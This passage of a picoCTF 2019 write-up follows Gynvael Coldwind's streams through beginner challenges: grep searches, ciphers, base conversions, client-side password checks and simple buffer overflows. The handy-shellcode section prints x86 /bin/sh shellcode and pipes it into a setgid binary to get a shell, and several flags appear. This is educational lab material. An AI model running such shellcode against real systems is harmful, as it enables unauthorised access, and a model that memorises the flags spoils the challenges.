<td><a href="https://youtu.be/pYrGJuOUG7M?t=2h01m28s">Part 1 (2:01:28)</a></td>
</tr>
<tr>
<td><a href="#dont-use-client-side---web-exploitation">dont-use-client-side        </a></td>
<td>Web</td>
<td>100</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=2h02m40s">Part 1 (2:02:40)</a></td>
</tr>
<tr>
<td><a href="#logon---web-exploitation">logon                       </a></td>
<td>Web</td>
<td>100</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=2h05m42s">Part 1 (2:05:42)</a></td>
</tr>
<tr>
<td><a href="#strings-it---general-skills">strings it                  </a></td>
<td>General</td>
<td>100</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=2h11m07s">Part 1 (2:11:07)</a></td>
</tr>
<tr>
<td><a href="#vault-door-1---reverse-engineering">vault-door-1                </a></td>
<td>Reversing</td>
<td>100</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=2h13m31s">Part 1 (2:13:31)</a></td>
</tr>
<tr>
<td><a href="#whats-a-net-cat---general-skills">what&rsquo;s a net cat            </a></td>
<td>General</td>
<td>100</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=2h29m37s">Part 1 (2:29:37)</a></td>
</tr>
<tr>
<td><a href="#where-are-the-robots---web-exploitation">where are the robots        </a></td>
<td>Web</td>
<td>100</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=2h31m33s">Part 1 (2:31:33)</a></td>
</tr>
<tr>
<td><a href="#overflow-1---binary-exploitation">OverFlow 1                  </a></td>
<td>Binary</td>
<td>150</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=2h33m56s">Part 1 (2:33:56)</a></td>
</tr>
<tr>
<td><a href="#so-meta---forensics">So Meta                     </a></td>
<td>Forensics</td>
<td>150</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=2h44m34s">Part 1 (2:44:34)</a></td>
</tr>
<tr>
<td><a href="#what-lies-within---forensics">What Lies Within            </a></td>
<td>Forensics</td>
<td>150</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=2h46m30s">Part 1 (2:46:30)</a></td>
</tr>
<tr>
<td><a href="#extensions---forensics">Extensions                  </a></td>
<td>Forensics</td>
<td>150</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=3h08m03s">Part 1 (3:08:03)</a></td>
</tr>
<tr>
<td><a href="#shark-on-the-wire-1---forensics">shark on the wire 1         </a></td>
<td>Forensics</td>
<td>150</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=3h10m03s">Part 1 (3:10:03)</a></td>
</tr>
<tr>
<td><a href="#based---general-skills">Based                       </a></td>
<td>General</td>
<td>200</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=3h20m40s">Part 1 (3:20:40)</a></td>
</tr>
<tr>
<td><a href="#client-side-again---web-exploitation">Client-side-again           </a></td>
<td>Web</td>
<td>200</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=3h25m29s">Part 1 (3:25:29)</a></td>
</tr>
<tr>
<td><a href="#first-grep-part-ii---general-skills">First Grep: Part II         </a></td>
<td>General</td>
<td>200</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=3h36m48s">Part 1 (3:36:48)</a></td>
</tr>
<tr>
<td><a href="#flags---cryptography">Flags                       </a></td>
<td>Crypto</td>
<td>200</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=3h38m22s">Part 1 (3:38:22)</a></td>
</tr>
<tr>
<td><a href="#mr-worldwide---cryptography">Mr-Worldwide                </a></td>
<td>Crypto</td>
<td>200</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=3h44m54s">Part 1 (3:44:54)</a></td>
</tr>
<tr>
<td><a href="#open-to-admins---web-exploitation">Open-to-admins              </a></td>
<td>Web</td>
<td>200</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=4h05m34s">Part 1 (4:05:34)</a></td>
</tr>
<tr>
<td><a href="#tapping---cryptography">Tapping                     </a></td>
<td>Crypto</td>
<td>200</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=4h21m28s">Part 1 (4:21:28)</a></td>
</tr>
<tr>
<td><a href="#la-cifra-de---cryptography">la cifra de                 </a></td>
<td>Crypto</td>
<td>200</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=4h23m14s">Part 1 (4:23:14)</a></td>
</tr>
<tr>
<td><a href="#picobrowser---web-exploitation">picobrowser                 </a></td>
<td>Web</td>
<td>200</td>
<td><a href="https://youtu.be/gHlundcY9GA?t=22m42s">Part 2 (22:42)</a></td>
</tr>
<tr>
<td><a href="#plumbing---general-skills">plumbing                    </a></td>
<td>General</td>
<td>200</td>
<td><a href="https://youtu.be/gHlundcY9GA?t=29m03s">Part 2 (29:03)</a></td>
</tr>
<tr>
<td><a href="#rsa-pop-quiz---cryptography">rsa-pop-quiz                </a></td>
<td>Crypto</td>
<td>200</td>
<td><a href="https://youtu.be/gHlundcY9GA?t=30m11s">Part 2 (30:11)</a></td>
</tr>
<tr>
<td><a href="#slippery-shellcode---binary-exploitation">slippery-shellcode          </a></td>
<td>Binary</td>
<td>200</td>
<td><a href="https://youtu.be/gHlundcY9GA?t=51m31s">Part 2 (51:31)</a></td>
</tr>
<tr>
<td><a href="#vault-door-3---reverse-engineering">vault-door-3                </a></td>
<td>Reversing</td>
<td>200</td>
<td><a href="https://youtu.be/gHlundcY9GA?t=1h16m40s">Part 2 (1:16:40)</a></td>
</tr>
<tr>
<td><a href="#whats-the-difference---general-skills">whats-the-difference        </a></td>
<td>General</td>
<td>200</td>
<td><a href="https://youtu.be/gHlundcY9GA?t=1h34m10s">Part 2 (1:34:10)</a></td>
</tr>
<tr>
<td><a href="#where-is-the-file---general-skills">where-is-the-file           </a></td>
<td>General</td>
<td>200</td>
<td><a href="https://youtu.be/gHlundcY9GA?t=1h39m58s">Part 2 (1:39:58)</a></td>
</tr>
<tr>
<td><a href="#whitepages---forensics">WhitePages                  </a></td>
<td>Forensics</td>
<td>250</td>
<td><a href="https://youtu.be/gHlundcY9GA?t=1h41m20s">Part 2 (1:41:20)</a></td>
</tr>
<tr>
<td><a href="#c0rrupt---forensics">c0rrupt                     </a></td>
<td>Forensics</td>
<td>250</td>
<td><a href="https://youtu.be/gHlundcY9GA?t=1h51m03s">Part 2 (1:51:03)</a></td>
</tr>
<tr>
<td><a href="#m00nwalk---forensics">m00nwalk                    </a></td>
<td>Forensics</td>
<td>250</td>
<td><a href="https://youtu.be/gHlundcY9GA?t=2h03m55s">Part 2 (2:03:55)</a></td>
</tr>
<tr>
<td><a href="#overflow2---binary-exploitation">OverFlow 2                  </a></td>
<td>Binary</td>
<td>250</td>
<td><a href="https://youtu.be/3x4nzymm33Q?t=17m33s">Part 3 (17:33)</a></td>
</tr>
<tr>
<td><a href="#newoverflow-1---binary-exploitation">NewOverFlow-1               </a></td>
<td>Binary</td>
<td>200</td>
<td><a href="https://youtu.be/3x4nzymm33Q?t=32m17s">Part 3 (32:17)</a></td>
</tr>
<tr>
<td><a href="#like1000---forensics">like1000                    </a></td>
<td>Forensics</td>
<td>250</td>
<td><a href="https://youtu.be/3x4nzymm33Q?t=1h14m51s">Part 3 (1:14:51)</a></td>
</tr>
<tr>
<td><a href="#vault-door-4---reverse-engineering">vault-door-4                </a></td>
<td>Reversing</td>
<td>250</td>
<td><a href="https://youtu.be/3x4nzymm33Q?t=1h32m45s">Part 3 (1:32:45)</a></td>
</tr>
<tr>
<td><a href="#irish-name-repo-1---web-exploitation">Irish-Name-Repo 1           </a></td>
<td>Web</td>
<td>300</td>
<td><a href="https://youtu.be/3x4nzymm33Q?t=1h38m26s">Part 3 (1:38:26)</a></td>
</tr>
<tr>
<td><a href="#flag_shop---general-skills">flag_shop                   </a></td>
<td>General</td>
<td>300</td>
<td><a href="https://youtu.be/3x4nzymm33Q?t=1h48m23s">Part 3 (1:48:23)</a></td>
</tr>
<tr>
<td><a href="#asm1---reverse-engineering">asm1                        </a></td>
<td>Reversing</td>
<td>200</td>
<td><a href="https://youtu.be/3x4nzymm33Q?t=2h02m44s">Part 3 (2:02:44)</a></td>
</tr>
<tr>
<td><a href="#newoverflow-2---binary-exploitation">New Overflow-2              </a></td>
<td>Binary</td>
<td>250</td>
<td><a href="https://youtu.be/gEPd1ref9s0?t=25m45s">Part 4 (25:45)</a></td>
</tr>
<tr>
<td><a href="#asm2---reverse-engineering">asm2                        </a></td>
<td>Reversing</td>
<td>250</td>
<td><a href="https://youtu.be/gEPd1ref9s0?t=52m41s">Part 4 (52:41)</a></td>
</tr>
<tr>
<td><a href="#canary---binary-exploitation">CanaRy                      </a></td>
<td>Binary</td>
<td>300</td>
<td><a href="https://youtu.be/gEPd1ref9s0?t=1h07m25s">Part 4 (1:07:25)</a></td>
</tr>
<tr>
<td><a href="#investigative-reversing-0---forensics">Investigative Reversing 0   </a></td>
<td>Forensics</td>
<td>300</td>
<td><a href="https://youtu.be/gEPd1ref9s0?t=1h57m03s">Part 4 (1:57:03)</a></td>
</tr>
<tr>
<td><a href="#asm3---reverse-engineering">asm3                        </a></td>
<td>Reversing</td>
<td>300</td>
<td><a href="https://youtu.be/gNvvZhpYHpw?t=35m12s">Part 5 (35:12)</a></td>
</tr>
<tr>
<td><a href="#minirsa---cryptography">miniRSA                     </a></td>
<td>Crypto</td>
<td>300</td>
<td><a href="https://youtu.be/gNvvZhpYHpw?t=1h01m08s">Part 5 (1:01:08)</a></td>
</tr>
<tr>
<td><a href="#mus1c---general-skills">mus1c                       </a></td>
<td>General</td>
<td>300</td>
<td><a href="https://youtu.be/gNvvZhpYHpw?t=1h17m45s">Part 5 (1:17:45)</a></td>
</tr>
<tr>
<td><a href="#shark-on-the-wire-2---forensics">shark on the wire 2         </a></td>
<td>Forensics</td>
<td>300</td>
<td><a href="https://youtu.be/gNvvZhpYHpw?t=1h29m57s">Part 5 (1:29:57)</a></td>
</tr>
<tr>
<td><a href="#leap-frog---binary-exploitation">leap-frog                   </a></td>
<td>Binary</td>
<td>300</td>
<td><a href="https://youtu.be/rK2y0wMS_9w?t=31m24s">Part 6 (31:24)</a></td>
</tr>
<tr>
<td><a href="#reverse_cipher---reverse-engineering">reverse_cipher              </a></td>
<td>Reversing</td>
<td>300</td>
<td><a href="https://youtu.be/rK2y0wMS_9w?t=1h00m27s">Part 6 (1:00:27)</a></td>
</tr>
<tr>
<td><a href="#stringzz---binary-exploitation">stringzz                    </a></td>
<td>Binary</td>
<td>300</td>
<td><a href="https://youtu.be/rK2y0wMS_9w?t=1h13m13s">Part 6 (1:13:13)</a></td>
</tr>
<tr>
<td><a href="#investigative-reversing-1---forensics">Investigative Reversing 1   </a></td>
<td>Forensics</td>
<td>350</td>
<td><a href="https://youtu.be/rK2y0wMS_9w?t=1h30m43s">Part 6 (1:30:43)</a></td>
</tr>
<tr>
<td><a href="#pastaaaa---forensics">pastaAAA                    </a></td>
<td>Forensics</td>
<td>350</td>
<td><a href="https://youtu.be/rK2y0wMS_9w?t=1h43m42s">Part 6 (1:43:42)</a></td>
</tr>
</tbody>
</table>
<h2 id="note">Note:</h2>
<p>If you&rsquo;re following along with your own picoctf account and solving challenges, not all values in the writeups will be the same as yours. For example, the last few characters of the flags are randomized, problem paths in the shell server are different for each user, and for the asm reversing problems, the values you get are different.</p>
<h2 id="credits">Credits</h2>
<p>All the credit goes to <a href="https://www.youtube.com/channel/UCCkVMojdBWS-JtH7TliWkVg">Gynvael Coldwind</a> for making these streams. Check him out.<br>
I based the table format above on <a href="https://github.com/shiltemann/CTF-writeups-public/blob/master/PicoCTF_2018/writeup.md#overview">this</a>.<br>
J.V. for the timestamps in Parts 2, 3, and 4.</p>
<h2 id="the-factorys-secret---general-skills">The Factory&rsquo;s Secret - General Skills</h2>
<p>Gynvael gave up on this. Maybe it was too easy.</p>
<h2 id="glory-of-the-garden---forensics">Glory of the Garden - Forensics</h2>
<pre><code class="language-console" data-lang="console">$ file garden.jpg # This is to confirm that this file is actually a jpg
garden.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 2999x2249, frames 3
$ ls -la garden.jpg # Check size
-rw-rw-rw- 1 root root 2295192 Sep 28  2019 garden.jpg
$ strings garden.jpg | grep pico # Look for the string “pico” in the file
Here is a flag &quot;picoCTF{more_than_m33ts_the_3y3b7FBD20b}&quot;
</code></pre><p>Grep to win (used in super easy challenges or badly prepared challenges)</p>
<h2 id="insp3ct0r---web-exploitation">Insp3ct0r - Web Exploitation</h2>
<p>Just use “view page source”</p>
<h2 id="lets-warm-up---general-skills">Let&rsquo;s Warm Up - General Skills</h2>
<p>Just use an online ascii table or hex to ascii converter or the following</p>
<pre><code class="language-pycon" data-lang="pycon">$ python
&gt;&gt;&gt; chr(0x70)
'p'
</code></pre><p>or just <code>man ascii</code></p>
<h2 id="the-numbers---cryptography">The Numbers - Cryptography</h2>
<p>There are only numbers no larger than 26 so the numbers just stand for the index of each letter in the alphabet. Manually do it or use this script from Gynvael:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> string
a <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span>
k <span style="color:#f92672">=</span> [<span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">14</span>]

<span style="color:#75715e"># We don&#39;t know if the index starts at 0 or 1</span>
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([a[n<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#66d9ef">for</span> n <span style="color:#f92672">in</span> k]))
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([a[n] <span style="color:#66d9ef">for</span> n <span style="color:#f92672">in</span> k]))
</code></pre></div><h2 id="warmed-up---general-skills">Warmed Up - General Skills</h2>
<p>0x3D to base 10</p>
<pre><code>0x3        +      0xD =
3 * 16    +      0xD =
48         +      0xD =
48         +      13   =
61
</code></pre><h2 id="2warm---general-skills">2Warm - General Skills</h2>
<pre><code class="language-pycon" data-lang="pycon">$ python
&gt;&gt;&gt; bin(42)
'0b101010'
</code></pre><p>or use math and do it the long way</p>
<pre><code>2 * 16  =  0x20  = 32 
3 * 16  =  0x30  =  48

So 42 in decimal is 0x2A

Powers of 2: 8421

2      A
01    1010
</code></pre><h2 id="handy-shellcode---binary-exploitation">handy-shellcode - Binary Exploitation</h2>
<p>Connect to the shell server</p>
<pre><code class="language-console" data-lang="console">$ ls -la  /problems/handy-shellcode_4_037bd47611d842b565cfa1f378bfd8d9
total 732
drwxr-xr-x   2 root       root                4096 Sep 28  2019 .
drwxr-x--x 684 root       root               69632 Oct 10  2019 ..
-r--r-----   1 hacksports handy-shellcode_4     39 Sep 28  2019 flag.txt
-rwxr-sr-x   1 hacksports handy-shellcode_4 661832 Sep 28  2019 vuln
-rw-rw-r--   1 hacksports hacksports           624 Sep 28  2019 vuln.c
</code></pre><p>The gets() function is the vulnerable part of the code. This means we can use any character except &lsquo;\n&rsquo; or 0x0A</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf){
  gets(buf);
  puts(buf);
}
</code></pre></div><p>In main(), this line runs the input</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">((<span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>)())buf)();
</code></pre></div><p>If we just run the program and put in input like asdf, the program will crash since asdf aren&rsquo;t valid instruction that can be executed</p>
<pre><code class="language-console" data-lang="console">$ ./vuln
Enter your shellcode:
asdf
asdf
Thanks! Executing now...
Segmentation fault (core dumped)
</code></pre><p>As we can see, the program just segfaults.</p>
<p>However, if we use 0xC3 as the input, the program will run without crashing since 0xC3 is the &lsquo;ret&rsquo; assembly instruction, so when we run the program with it as input, the program should exit without crashing.</p>
<pre><code class="language-console" data-lang="console">$ echo -e '\xC3' | ./vuln 
</code></pre><p>This confirms our assumptions of how the program runs. According to Gynvael, exploitation is a process where &ldquo;everything can go wrong,&rdquo; so it&rsquo;s good to work with small steps to make sure our assumptions are correct.</p>
<p>Find out what architecture the shellcode should be:</p>
<pre><code class="language-console" data-lang="console">$ file vuln
vuln: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=7b65fbf1fba331b6b09a6812a338dbb1118e68e9, not stripped
</code></pre><p>This shows us that the program is a 32 bit program running on x86 Linux.</p>
<p>To find some shellcode just google &ldquo;x86 32 linux shellcode&rdquo;
We find some shellcode for spawning a shell <a href="http://shell-storm.org/shellcode/files/shellcode-827.php">here</a></p>
<pre><code>&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;
</code></pre><p>Let&rsquo;s give vuln the shellcode as input</p>
<pre><code class="language-console" data-lang="console">$ echo -e '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80` | ./vuln
Enter your shellcode:
1Ph//shh/binPS
Thanks! Executing now...
</code></pre><p>The shellcode above doesn&rsquo;t seem to work, but it actually does. The program just exits after successfully running the shellcode and spawning a shell. In order to interact with the shell, we need to keep stdin open.</p>
<pre><code class="language-console" data-lang="console">$ (echo -e '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`; cat) | ./vuln
Enter your shellcode:
1Ph//shh/binPS
Thanks! Executing now...
ls
flag.txt  vuln  vuln.c
cat flag.txt
picoCTF{h4ndY_d4ndY_sh311c0d3_55c521fe}
</code></pre><p>Gynvael saves his shellcode to a file and then uses <code>cat shellcode - | ./vuln</code> instead but the above does the same thing.</p>
<h2 id="practice-run-1---binary-exploitation">practice-run-1 - Binary Exploitation</h2>
<p>Login to the shell server and just run the binary</p>
<pre><code class="language-console" data-lang="console">$ cd /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e
$ ls -la
total 84
drwxr-xr-x   2 root       root              4096 Sep 28  2019 .
drwxr-x--x 684 root       root             69632 Oct 10  2019 ..
-rwxr-sr-x   1 hacksports practice-run-1_0  7252 Sep 28  2019 run_this
$ ./run_this
picoCTF{g3t_r3adY_2_r3v3r53}
</code></pre><h2 id="unzip---forensics">unzip - Forensics</h2>
<pre><code class="language-console" data-lang="console">$ file flag.zip
flag.zip: Zip archive data, at least v2.0 to extract
$ strings flag.zip | grep pico # Grep2win doesn't work
$ unzip flag.zip
Archive:  flag.zip
  inflating: flag.png
$ ls
flag.png  flag.zip
</code></pre><p>The flag is in flag.png</p>
<h2 id="vault-door-training---reverse-engineering">vault-door-training - Reverse Engineering</h2>
<p>The flag is in the source code</p>
<h2 id="13---cryptography">13 - Cryptography</h2>
<p>Just use a ROT13 decrypter
ROT13 is just a simple cipher.
Gynvael suggests implementing it if you haven&rsquo;t already; otherwise just use a decrypter online like <a href="https://rot13.com/">https://rot13.com/</a>. Time counts on CTFs, so just use the fastest method.</p>
<h2 id="bases---general-skills">Bases - General Skills</h2>
<p>Convert from Base64
Base64 is used to encode binary to a printable text</p>
<p>Python2</p>
<pre><code class="language-pycon" data-lang="pycon">$ python
&gt;&gt;&gt; &quot;bDNhcm5fdGgzX3IwcDM1&quot;.decode(&quot;base64&quot;)
'l3arn_th3_r0p35'
</code></pre><p>Python3</p>
<pre><code class="language-pycon" data-lang="pycon">$ python3
&gt;&gt;&gt; import base64
base64.b64decode(&quot;bDNhcm5fdGgzX3IwcDM1&quot;)
b'l3arn_th3_r0p35'
</code></pre><h2 id="easy1---cryptography">Easy1 - Cryptography</h2>
<p>Basic substitution cipher <a href="https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher">Vigenère cipher</a>
Use the table</p>
<h2 id="first-grep---general-skills">First Grep - General Skills</h2>
<p>Grep to win</p>
<pre><code class="language-console" data-lang="console">$ cat file | grep pico
picoCTF{grep_is_good_to_find_things_ad4e9645}
</code></pre><h2 id="overflow-0---binary-exploitation">OverFlow 0 - Binary Exploitation</h2>
<p>This line of code means the  sigsegv_handler() function is called when the program crashes.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">signal(SIGSEGV, sigsegv_handler);
</code></pre></div><p>We just have to crash the program to get the flag read to us:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sigsegv_handler</span>(<span style="color:#66d9ef">int</span> sig) {
  fprintf(stderr, <span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, flag); <span style="color:#75715e">// This prints our flag
</span><span style="color:#75715e"></span>  fflush(stderr);
  exit(<span style="color:#ae81ff">1</span>);
}
</code></pre></div><p>To crash the program, just overflow the buffer by sending in more than buffer length</p>
<pre><code class="language-console" data-lang="console">$ ./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{3asY_P3a5y1fcf81f9}
</code></pre><h2 id="resources---general-skills">Resources - General Skills</h2>
<p>Just go to the link and scroll down</p>
<h2 id="caesar----cryptography">caesar  - Cryptography</h2>
<p>Caesar cipher is basically rot-n where n is a number. Use an online decoder like <a href="http://theblob.org/rot.cgi">http://theblob.org/rot.cgi</a>.</p>
<h2 id="dont-use-client-side---web-exploitation">dont-use-client-side - Web Exploitation</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">verify</span>() {
  <span style="color:#a6e22e">checkpass</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;pass&#34;</span>).<span style="color:#a6e22e">value</span>;
  <span style="color:#a6e22e">split</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>;
  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">split</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;pico&#39;</span>) {
    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#a6e22e">split</span><span style="color:#f92672">*</span><span style="color:#ae81ff">6</span>, <span style="color:#a6e22e">split</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;b956&#39;</span>) {
      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#a6e22e">split</span>, <span style="color:#a6e22e">split</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;CTF{&#39;</span>) {
       <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#a6e22e">split</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>, <span style="color:#a6e22e">split</span><span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;ts_p&#39;</span>) {
        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#a6e22e">split</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>, <span style="color:#a6e22e">split</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;lien&#39;</span>) {
          <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#a6e22e">split</span><span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>, <span style="color:#a6e22e">split</span><span style="color:#f92672">*</span><span style="color:#ae81ff">6</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;lz_e&#39;</span>) {
            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#a6e22e">split</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>, <span style="color:#a6e22e">split</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;no_c&#39;</span>) {
              <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#a6e22e">split</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>, <span style="color:#a6e22e">split</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;b}&#39;</span>) {
                <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;Password Verified&#34;</span>)
                }
              }
            }
    
          }
        }
      }
    }
  }
  <span style="color:#66d9ef">else</span> {
    <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;Incorrect password&#34;</span>);
  }
  
}
</code></pre></div><p>Just sort the substrings in order and then add them all to form the completed flag.</p>
<h2 id="logon---web-exploitation">logon - Web Exploitation</h2>
<p>Set the admin cookie to True</p>
<h2 id="strings-it---general-skills">strings it - General Skills</h2>
<p>Another grep to win</p>
<pre><code class="language-console" data-lang="console">$ strings strings | grep pico
picoCTF{5tRIng5_1T_c611cac7}
</code></pre><h2 id="vault-door-1---reverse-engineering">vault-door-1 - Reverse Engineering</h2>
<p>Just sort the charAt() by indexes and combine the characters into the completed string.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>  <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;d&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>29<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;7&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>4<span style="color:#f92672">)</span>  <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;r&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>  <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;5&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>23<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;r&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>3<span style="color:#f92672">)</span>  <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;c&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>17<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;4&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>  <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;3&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>7<span style="color:#f92672">)</span>  <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;b&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>10<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;_&#39;</span>
